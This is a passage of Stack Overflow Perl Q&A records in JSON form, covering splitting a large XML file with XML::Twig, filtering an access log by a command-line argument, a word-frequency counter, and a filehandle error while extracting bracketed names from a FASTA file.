thing you <em>didn't</em> mention:</p>\n\n<blockquote>\n  <p>Martin thanks a lot. This works great. But there's one thing I forgot to mention. My original.xml has over one million parent tags.</p>\n</blockquote>\n\n<p>Is quite important - XML is a tag-matching process, which means it can't be sure it's finished and the XML is valid until it reaches the end. That normally means parsing the whole document to verify that the tags are matched. </p>\n\n<p>One of the drawbacks of XML is that it's memory footprint is often around 10x the file size. </p>\n\n<p>However, <code>XML::Twig</code> has another useful feature - <code>twig_handlers</code> and <code>purge</code>. </p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\nuse XML::Twig;\n\nsub extract_parent_elt {\n    my ( $twig, $parent_elt ) = @_;\n\n    #remove children if that's what you want?\n    $_-&gt;delete for $parent_elt-&gt;children();\n\n    #pick out the attr for our file name\n    my $newname = $parent_elt-&gt;att('attr1');\n    print \"Opening:\", $newname, \".xml\\n\";\n\n    #create a new document - insert a 'newroot' as it's root element. \n    my $new_doc = XML::Twig-&gt;new-&gt;set_root( XML::Twig::Elt-&gt;new('newroot') );\n    #cut and paste this element into the new doc. \n    $parent_elt-&gt;cut;\n    $parent_elt-&gt;paste( $new_doc-&gt;root );\n    #note - because we're purging and not saving the 'old' doc, a\n    #cut doesn't modify the original. \n\n    #open output:\n    open( my $output, '&gt;', \"$newname.xml\" ) or die $!;\n    #note - pretty print has some limitations. \n    #specifically - there are some XML things that it breaks. \n    #your code doesn't _appear_ to have these. \n    $new_doc -&gt; set_pretty_print('indented_a'); \n    print {$output} $new_doc-&gt;sprint;\n    close($output);\n\n    #discard everything so far.\n    $twig-&gt;purge;\n}\n\nmy $twig = XML::Twig-&gt;new( \n                twig_handlers =&gt; { 'parent' =&gt; \\&amp;extract_parent_elt } );\n\n$twig -&gt; parsefile('original.xml');\n</code></pre>\n\n<p>The handler fires on finding a matched 'close' element, and gets handed that chunk of XML. <code>purge</code> tells twig to discard anything that's been processed thus far (e.g. any that have had 'closed' tags). </p>\n"}], "owner": {"reputation": 2081, "user_id": 1396141, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/a0784eb7d2bc98806e360d6d86989cf1?s=128&d=identicon&r=PG", "display_name": "\u0422\u043e\u043c\u0438\u0446\u0430 \u041a\u043e\u0440\u0430\u045b", "link": "https://stackoverflow.com/users/1396141/%d0%a2%d0%be%d0%bc%d0%b8%d1%86%d0%b0-%d0%9a%d0%be%d1%80%d0%b0%d1%9b"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1447065851, "creation_date": 1446969311, "question_id": 33591873, "link": "https://stackoverflow.com/questions/33591873/split-and-process-xml-file", "title": "Split and process XML file", "body": "<p>I have an <code>original.xml</code> file structured like so:</p>\n\n<pre><code>&lt;root&gt;\n    &lt;parent attr1=\"val1\" attr2=\"val2\" ... &gt;\n        &lt;child key1=\"val3\" key2=\"val4\" ... /&gt;\n        &lt;child key1=\"val5\" key2=\"val6\" ... /&gt;\n        ...\n    &lt;/parent&gt;\n    ...\n    &lt;parent attr1=\"val7\" attr2=\"val8\" ... /&gt;\n    ...\n&lt;/root&gt;\n</code></pre>\n\n<p>For each <code>parent</code> node of this file I need to create a new file, name it according to the value of <code>attr1</code> attribute and insert this data:</p>\n\n<pre><code>&lt;newroot&gt;\n    &lt;newparent attr1=\"val1\" attr2=\"val2\" ... /&gt;\n&lt;/newroot&gt;\n</code></pre>\n\n<p>For that, I'm using this perl one-line command:</p>\n\n<pre><code>perl -p -i -e 'open(F, \"&gt;\", \"new/\".($1).\".xml\") if /&lt;parent attr1=\"(.*)\" attr2=\"(.*)\" ... /; print {F} \"&lt;newroot&gt;&lt;newparent attr1=\\\"\".($1).\"\\\" attr2=\\\"\".($2).\"\\\" /&gt;&lt;/newroot&gt;\";' \"original.xml\"\n</code></pre>\n\n<p>This works good enough for all the original <code>parent</code>s with no <code>child</code>ren. But for each <code>parent</code> that has <code>child</code>ren (let's say the first <code>parent</code> in my example), it multiplies the output for as many rows as the <code>parent</code> has, like so:</p>\n\n<pre><code>&lt;newroot&gt;\n    &lt;newparent attr1=\"val1\" attr2=\"val2\" ... /&gt;\n&lt;/newroot&gt;\n&lt;newroot&gt;\n    &lt;newparent attr1=\"\" attr2=\"\" ... /&gt;\n&lt;/newroot&gt;\n&lt;newroot&gt;\n    &lt;newparent attr1=\"\" attr2=\"\" ... /&gt;\n&lt;/newroot&gt;\n...\n&lt;newroot&gt;\n    &lt;newparent attr1=\"\" attr2=\"\" ... /&gt;\n&lt;/newroot&gt;\n</code></pre>\n\n<p>I don't quite understand why this happens. How do I make my perl command output only one <code>newroot</code> element with the needed data?</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446957177, "post_id": 33590730, "comment_id": 54957210, "body": "Don&#39;t surround your regex with quotes, and do escape the brackets (<code>\\[</code>) as they denote a character class."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446957297, "post_id": 33590730, "comment_id": 54957222, "body": "Actually, what was your intent with the brackets? Were you trying to match <code>[200]</code>?"}, {"owner": {"reputation": 177, "user_id": 4081110, "user_type": "registered", "accept_rate": 73, "profile_image": "https://graph.facebook.com/720067245/picture?type=large", "display_name": "Terik Brunson", "link": "https://stackoverflow.com/users/4081110/terik-brunson"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446957517, "post_id": 33590730, "comment_id": 54957253, "body": "Yes, that was the intent"}, {"owner": {"reputation": 61610, "user_id": 725418, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/82ac2dc3e1ad4b7187f245c416528df9?s=128&d=identicon&r=PG", "display_name": "TLP", "link": "https://stackoverflow.com/users/725418/tlp"}, "edited": false, "score": 0, "creation_date": 1446971169, "post_id": 33590730, "comment_id": 54959467, "body": "In *nix: <code>grep 200 log.txt</code>, in windows <code>findstr 200 log.txt</code>."}], "answers": [{"comments": [{"owner": {"reputation": 177, "user_id": 4081110, "user_type": "registered", "accept_rate": 73, "profile_image": "https://graph.facebook.com/720067245/picture?type=large", "display_name": "Terik Brunson", "link": "https://stackoverflow.com/users/4081110/terik-brunson"}, "edited": false, "score": 0, "creation_date": 1446957563, "post_id": 33590798, "comment_id": 54957260, "body": "It&#39;s actually a requirement for me to have 200 as the second parameter, and that&#39;s what&#39;s causing my issue."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 177, "user_id": 4081110, "user_type": "registered", "accept_rate": 73, "profile_image": "https://graph.facebook.com/720067245/picture?type=large", "display_name": "Terik Brunson", "link": "https://stackoverflow.com/users/4081110/terik-brunson"}, "edited": false, "score": 1, "creation_date": 1446957687, "post_id": 33590798, "comment_id": 54957277, "body": "@TerikBrunson: Okay, simply fixed. You can just remove the pattern using <code>pop</code> instead of <code>shift</code>. But you must remove it from <code>@ARGV</code> otherwise <code>&lt;&gt;</code> treats it as a file name"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 177, "user_id": 4081110, "user_type": "registered", "accept_rate": 73, "profile_image": "https://graph.facebook.com/720067245/picture?type=large", "display_name": "Terik Brunson", "link": "https://stackoverflow.com/users/4081110/terik-brunson"}, "edited": false, "score": 0, "creation_date": 1446962334, "post_id": 33590798, "comment_id": 54957956, "body": "@TerikBrunson: Please take a look at my recent changes, and the commentary explaining <code>\\Q</code>"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 3, "last_activity_date": 1446962077, "last_edit_date": 1446962077, "creation_date": 1446957445, "answer_id": 33590798, "question_id": 33590730, "link": "https://stackoverflow.com/questions/33590730/perl-command-line-arguments-used-in-regular-expressions/33590798#33590798", "title": "Perl Command Line Arguments Used In Regular Expressions", "body": "<p>The first parameter to a Perl program is in <code>$ARGV[0]</code>, and the empty diamond operator reads data from the files named in <code>@ARGV</code></p>\n\n<p>You need to write your program like this. It removes the pattern parameter from the end of <code>@ARGV</code> before using it in the loop, and takes advantage of Perl's <code>$_</code> variable being the default parameter to many operators</p>\n\n<p>The <code>\\Q</code> in the regex forces all following non-alphanumeric characters to be escaped, and hence taken literally. That includes the square brackets and the <em>contents</em> of <code>$pattern</code>, which may otherwise be taken as regex metacharacters with a special meaning</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $pattern = pop @ARGV;\n\nwhile ( &lt;&gt; ) {\n    print if /\\Q[$pattern]/;\n}\n</code></pre>\n\n<p>and you should run it like this</p>\n\n<pre><code>perl FLTR_WLOG_STATUS_CODES.pl small_access_log_Jul95_01.txt 200\n</code></pre>\n\n<h3>Update</h3>\n\n<p>If you're forced to accept the data input from STDIN instead of from a command-line file name, then you need to do this</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $pattern = pop @ARGV;\n\nwhile ( &lt;STDIN&gt; ) {\n    print if /\\Q[$pattern]/;\n}\n</code></pre>\n\n<p>and you should run it like this</p>\n\n<pre><code>type small_access_log_Jul95_01.txt | perl FLTR_WLOG_STATUS_CODES.pl 200\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "is_accepted": false, "score": 1, "last_activity_date": 1446958052, "last_edit_date": 1446958052, "creation_date": 1446957491, "answer_id": 33590803, "question_id": 33590730, "link": "https://stackoverflow.com/questions/33590730/perl-command-line-arguments-used-in-regular-expressions/33590803#33590803", "title": "Perl Command Line Arguments Used In Regular Expressions", "body": "<p>With the command line:</p>\n\n<pre><code>perl FLTR_WLOG_STATUS_CODES.pl small_access_log_Jul95_01.txt 200\n</code></pre>\n\n<p>The code would be:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nmy $arg = pop;\n\nwhile (&lt;&gt;) {\n    print if /\\[$arg\\]/;\n}\n</code></pre>\n"}], "owner": {"reputation": 177, "user_id": 4081110, "user_type": "registered", "accept_rate": 73, "profile_image": "https://graph.facebook.com/720067245/picture?type=large", "display_name": "Terik Brunson", "link": "https://stackoverflow.com/users/4081110/terik-brunson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 471, "favorite_count": 0, "accepted_answer_id": 33590798, "answer_count": 2, "score": 0, "last_activity_date": 1446962077, "creation_date": 1446956712, "question_id": 33590730, "link": "https://stackoverflow.com/questions/33590730/perl-command-line-arguments-used-in-regular-expressions", "title": "Perl Command Line Arguments Used In Regular Expressions", "body": "<p>Given various strings in a text file that are in this format: </p>\n\n<pre><code>199.72.81.55 - - [01/Jul/1995:00:00:01 -0400] \"GET /history/apollo/ HTTP/1.0\" 200 6245\n</code></pre>\n\n<p>I am trying to read in a number from the command line like this:</p>\n\n<pre><code>type small_access_log_Jul95_01.txt | perl FLTR_WLOG_STATUS_CODES.pl 200\n</code></pre>\n\n<p>The \"small_access_log\" txt file contains a line of the format before given on each line. I am having trouble reading in and using the argument \"200\" in a search, because it assigns 200 to be the first argument, it seems. \nHere is the code that I'm working on:</p>\n\n<pre><code>use strict;\nuse warnings;\n\n\nwhile ( &lt;&gt; ) {\n\n if ($_ =~ /\"[$ARGV[1]]\"/){\n print $_;}\n\n }\n</code></pre>\n\n<p>It is only supposed to print the lines that contain that \"200\" or whatever is input through the command line. </p>\n\n<p>Here is the working version in python:</p>\n\n<pre><code>import sys\nimport re\n\nTEXT = sys.argv[1]\nfor n in [x for x in sys.stdin.readlines() if re.search(\".*?\"+re.escape(TEXT) +\"\\s([0-9]+)$\",x)]:\n    print n\n</code></pre>\n\n<p>So what do I need to do differently with the command line in perl to make this work?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 42504, "user_id": 1161878, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/0157ddd785dc01e95342e3661d34b42a?s=128&d=identicon&r=PG", "display_name": "Gene", "link": "https://stackoverflow.com/users/1161878/gene"}, "edited": false, "score": 1, "creation_date": 1446946549, "post_id": 33589769, "comment_id": 54955579, "body": "Please use the help to find out how to format code."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1446950540, "post_id": 33589769, "comment_id": 54956220, "body": "You really need to learn both how to lay out your code so that it is legible, and to use Stack Overflow&#39;s <i>markdown</i> to distinguish it as code. You shouldn&#39;t just leave a blank line between statements to stop them from wrapping. I&#39;ve done it for you this time, but please do some reading"}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1446950767, "creation_date": 1446950767, "answer_id": 33590185, "question_id": 33589769, "link": "https://stackoverflow.com/questions/33589769/perl-word-frequency-counter/33590185#33590185", "title": "Perl word frequency counter", "body": "<p>The main problem is this line</p>\n\n<pre><code>my @ARGV     = &lt;STDIN&gt;;\n</code></pre>\n\n<p>Which defines a lexical array <code>@ARGV</code> that is nothing to do with the built-in global variable. And you probably shouldn't be reading into from STDIN at all</p>\n\n<p>Apart from that, it's not clear how you want your program to behave, so I can't offer much more detailed advice</p>\n"}], "owner": {"reputation": 21, "user_id": 5525587, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/646b6d34ce067d3c4bc91c5556649fa7?s=128&d=identicon&r=PG&f=1", "display_name": "abishop128", "link": "https://stackoverflow.com/users/5525587/abishop128"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 66, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1446950767, "creation_date": 1446946360, "last_edit_date": 1446950572, "question_id": 33589769, "link": "https://stackoverflow.com/questions/33589769/perl-word-frequency-counter", "title": "Perl word frequency counter", "body": "<p>I am trying to make an addition to a word frequency counter I made to take all of STDIN and report to STDOUT each word that appeared in the input and how many times it appeared. I added the -i option and am transliterating all of the letters to lower case before hashing.</p>\n\n<p>The problem I am having is that nothing is being reported to STDOUT and nothing is printing to the command console. It runs without error being produced or given.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nmy @ARGV     = &lt;STDIN&gt;;\nmy $filename = $ARGV[0];\nmy $word     = 0;\nmy %freq     = ();\nmy @wordarray;\n\nopen( FILE, $filename );\n\nwhile ( &lt;STDIN&gt; ) {\n\n    if ( scalar( @ARGV ) &gt; 1 ) {\n\n        if ( $ARGV[1] eq \"-i\" ) {\n\n            my $string = $_;\n            $string =~ tr/A-Z/a-z/;\n            tr/A-Za-z/ /cs;\n            my @wordarray = ( split( ' ', lc $string ) );\n\n            foreach my $word ( @wordarray ) {\n                $freq{$word}++;\n            }\n        }\n    }\n\n    if ( scalar( @ARGV ) &lt; 2 ) {\n\n        my $string = $_;\n        tr/A-Za-z/ /cs;\n        my @wordarray = ( split( ' ', $string ) );\n\n        foreach my $word ( @wordarray ) {\n            $freq{$word}++;\n        }\n    }\n}\n\nforeach $word ( sort keys %freq ) {\n    print \"$word $freq{$word}\\n\";\n}\n\nclose( FILE );\n</code></pre>\n"}, {"tags": ["perl", "filehandle"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446946721, "post_id": 33589678, "comment_id": 54955614, "body": "You&#39;re setting your filehandle to an empty string at the start, and then you&#39;re re-assigning it to a string in your loop. Don&#39;t do that."}, {"owner": {"reputation": 97, "user_id": 5068162, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/a27e38bced150581afa61861fdccbeda?s=128&d=identicon&r=PG&f=1", "display_name": "Elle", "link": "https://stackoverflow.com/users/5068162/elle"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446948278, "post_id": 33589678, "comment_id": 54955837, "body": "Then what would you suggest I do to fix the code?"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446950775, "post_id": 33589678, "comment_id": 54956261, "body": "Use a different variable to store the result of the regex match. I can write up a proper answer later."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1446962316, "post_id": 33589678, "comment_id": 54957953, "body": "Can you include some sample input and expected output? Check out <a href=\"http://stackoverflow.com/help/mcve\">How to create a Minimal, Complete, and Verifiable example</a> for help."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446964899, "post_id": 33589678, "comment_id": 54958359, "body": "Pull out the text within the brackets, and put it where? Should the other lines without brackets still be included? Have you tried the code I posted in my answer?"}, {"owner": {"reputation": 61610, "user_id": 725418, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/82ac2dc3e1ad4b7187f245c416528df9?s=128&d=identicon&r=PG", "display_name": "TLP", "link": "https://stackoverflow.com/users/725418/tlp"}, "edited": false, "score": 0, "creation_date": 1446971636, "post_id": 33589678, "comment_id": 54959547, "body": "You should never get that error with this code. If the open fails, the program should die. If not, it is not unopened. Either this is not the code you actually used, or you removed something from it."}, {"owner": {"reputation": 97, "user_id": 5068162, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/a27e38bced150581afa61861fdccbeda?s=128&d=identicon&r=PG&f=1", "display_name": "Elle", "link": "https://stackoverflow.com/users/5068162/elle"}, "edited": false, "score": 0, "creation_date": 1446972334, "post_id": 33589678, "comment_id": 54959693, "body": "I wanted to pull the text within the brackets and write it to the new file I was creating. No, other lines without brackets should not be included. Yes, I tried the code you had posted in your answer. It didn&#39;t pull what I wanted it to pull. I wasn&#39;t able to get it to write properly in the file."}, {"owner": {"reputation": 97, "user_id": 5068162, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/a27e38bced150581afa61861fdccbeda?s=128&d=identicon&r=PG&f=1", "display_name": "Elle", "link": "https://stackoverflow.com/users/5068162/elle"}, "edited": false, "score": 0, "creation_date": 1446972357, "post_id": 33589678, "comment_id": 54959695, "body": "Also, this is the entire code I used. I have not removed or edited it in any way."}, {"owner": {"reputation": 61610, "user_id": 725418, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/82ac2dc3e1ad4b7187f245c416528df9?s=128&d=identicon&r=PG", "display_name": "TLP", "link": "https://stackoverflow.com/users/725418/tlp"}, "edited": false, "score": 0, "creation_date": 1446993733, "post_id": 33589678, "comment_id": 54965244, "body": "Oh lol, I just realized that you did this: <code>$file = $1;</code>, That&#39;s not good"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1446994078, "post_id": 33589678, "comment_id": 54965359, "body": "Missing <code>use strict;</code>."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446994314, "post_id": 33589678, "comment_id": 54965443, "body": "Without sample output, it&#39;s impossible to know what you&#39;re looking for. In general, when you&#39;re asking for help, you want to make it easy for other people to help you, not excruciatingly difficult."}, {"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1557088354, "post_id": 33589678, "comment_id": 98639409, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/q/8748891/608639\">How would I solve the following error &quot;readline() on unopened filehandle ...&quot;?</a>"}], "answers": [{"tags": [], "owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "is_accepted": false, "score": 0, "last_activity_date": 1447088814, "last_edit_date": 1495539874, "creation_date": 1446952501, "answer_id": 33590332, "question_id": 33589678, "link": "https://stackoverflow.com/questions/33589678/readline-unopened-file-handle-error-in-perl/33590332#33590332", "title": "readline () unopened file handle error in Perl", "body": "<p>As I said in my <a href=\"https://stackoverflow.com/questions/33589678/readline-unopened-file-handle-error-in-perl#comment54955614_33589678\">comment</a>, you're re-assigning your filehandle to the capture group in the middle of reading the file. Since you opened a separate file for output, I assume you want to print the matching strings to that file instead.</p>\n\n<p>Having said that, your requirements are pretty vague, your sample input doesn't look accurate, and you didn't provide any sample output, but if I understand your intent correctly, I think this is what you want:</p>\n\n<pre><code>my $file = 'myosin.fasta';\nmy $tmp = \"$file.tmp\";\n\nopen(my $new, '&gt;', $tmp) or die \"Can't open $tmp: $!\";\nopen(my $old, '&lt;', $file) or die \"Can't open $file: $!\";\n\nwhile (&lt;$old&gt;) {\n    if (/\\[([^]]+)\\]/) {\n        print $new \"$1\\n\";\n    }\n}\n\nclose($old);\nclose($new);\n\nrename($file, \"$file.bak\");\nrename($tmp, $file);\n</code></pre>\n\n<p>Contents of myosin.fasta after running the script:</p>\n\n<pre><code>Homo sapiens\nHomo sapiens\nHomo sapiens\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 61610, "user_id": 725418, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/82ac2dc3e1ad4b7187f245c416528df9?s=128&d=identicon&r=PG", "display_name": "TLP", "link": "https://stackoverflow.com/users/725418/tlp"}, "is_accepted": true, "score": 2, "last_activity_date": 1446993845, "creation_date": 1446993845, "answer_id": 33595187, "question_id": 33589678, "link": "https://stackoverflow.com/questions/33589678/readline-unopened-file-handle-error-in-perl/33595187#33595187", "title": "readline () unopened file handle error in Perl", "body": "<p>When you do this:</p>\n\n<pre><code>$file = $1;\n</code></pre>\n\n<p>You overwrite your file handle. Then you can no longer read from it. And you will get the error mentioned.</p>\n\n<p>You should of course save the match somewhere else, e.g.:</p>\n\n<pre><code>my $match = $1;\n</code></pre>\n\n<p>And probably also print it:</p>\n\n<pre><code>print $newfile $match;\n</code></pre>\n"}], "owner": {"reputation": 97, "user_id": 5068162, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/a27e38bced150581afa61861fdccbeda?s=128&d=identicon&r=PG&f=1", "display_name": "Elle", "link": "https://stackoverflow.com/users/5068162/elle"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1742, "favorite_count": 2, "accepted_answer_id": 33595187, "answer_count": 2, "score": 1, "last_activity_date": 1447088814, "creation_date": 1446945254, "last_edit_date": 1446999434, "question_id": 33589678, "link": "https://stackoverflow.com/questions/33589678/readline-unopened-file-handle-error-in-perl", "title": "readline () unopened file handle error in Perl", "body": "<p>I'm having trouble fixing an error in my code. I'm trying to get the code to read the input file and pull out only what is between the <code>[]</code>. However, the error I am getting is a <code>readline() on unopened filehandle</code>... I'm not sure what I'm doing incorrectly here for the <code>while ()</code> file handle.</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\n\nmy $file = '';\nmy $newfile = '';\nopen($newfile, '&gt;', 'newmyosin.fasta') or die \"Can't create file\", $!;\nopen($file, '&lt;', 'myosin.fasta') or die \"Can't open file\", $!;\n\nwhile(&lt;$file&gt;) {\n        print;\n        chomp;\n        if ( $_ =~ /\\[(.+)\\]/ ) {\n                $file = $1;\n        }\n}\n</code></pre>\n\n<p>So, for example:</p>\n\n<p>This would be what one part of my input file would look like:</p>\n\n<pre><code>&gt;gi|115527082|ref|NP_005954.3| myosin-1 [Homo sapiens] \n&gt;gi|226694176|sp|P12882.3|MYH1_HUMAN RecName: Full=Myosin-1; AltName: Full=Myosin heavy chain 1; AltName: Full=Myosin heavy chain 2x; Short=MyHC-2x; AltName: Full=Myosin heavy chain IIx/d; Short=MyHC-IIx/d; AltName: Full=Myosin heavy chain, skeletal muscle, adult 1 [Homo sapiens] \n&gt;gi|119610411|gb|EAW90005.1| hCG1986604, isoform CRA_b [Homo sapiens]\nMSSDSEMAIFGEAAPFLRKSERERIEAQNKPFDAKTSVFVVDPKESFVKATVQSREGGKVTAKTEAGATVTVKDDQVFPM\nNPPKYDKIEDMAMMTHLHEPAVLYNLKERYAAWMIYTYSGLFCVTVNPYKWLPVYNAEVVTAYRGKKRQEAPPHIFSISD\nNAYQFMLTDRENQSILITGESGAGKTVNTKRVIQYFATIAVTGEKKKEEVTSGKMQGTLEDQIISANPLLEAFGNAKTVR\nNDNSSRFGKFIRIHFGTTGKLASADIETYLLEKSRVTFQLKAERSYHIFYQIMSNKKPDLIEMLLITTNPYDYAFVSQGE\nITVPSIDDQEELMATDSAIEILGFTSDERVSIYKLTGAVMHYGNMKFKQKQREEQAEPDGTEVADKAAYLQNLNSADLLK\nALCYPRVKVGNEYVTKGQTVQQVYNAVGALAKAVYDKMFLWMVTRINQQLDTKQPRQYFIGVLDIAGFEIFDFNSLEQLC\nINFTNEKLQQFFNHHMFVLEQEEYKKEGIEWTFIDFGMDLAACIELIEKPMGIFSILEEECMFPKATDTSFKNKLYEQHL\nGKSNNFQKPKPAKGKPEAHFSLIHYAGTVDYNIAGWLDKNKDPLNETVVGLYQKSAMKTLALLFVGATGAEAEAGGGKKG\nGKKKGSSFQTVSALFRENLNKLMTNLRSTHPHFVRCIIPNETKTPGAMEHELVLHQLRCNGVLEGIRICRKGFPSRILYA\nDFKQRYKVLNASAIPEGQFIDSKKASEKLLGSIDIDHTQYKFGHTKVFFKAGLLGLLEEMRDEKLAQLITRTQAMCRGFL\nARVEYQKMVERRESIFCIQYNVRAFMNVKHWPWMKLYFKIKPLLKSAETEKEMANMKEEFEKTKEELAKTEAKRKELEEK\nMVTLMQEKNDLQLQVQAEADSLADAEERCDQLIKTKIQLEAKIKEVTERAEDEEEINAELTAKKRKLEDECSELKKDIDD\nLELTLAKVEKEKHATENKVKNLTEEMAGLDETIAKLTKEKKALQEAHQQTLDDLQAEEDKVNTLTKAKIKLEQQVDDLEG\nSLEQEKKIRMDLERAKRKLEGDLKLAQESTMDIENDKQQLDEKLKKKEFEMSGLQSKIEDEQALGMQLQKKIKELQARIE\nELEEEIEAERASRAKAEKQRSDLSRELEEISERLEEAGGATSAQIEMNKKREAEFQKMRRDLEEATLQHEATAATLRKKH\nADSVAELGEQID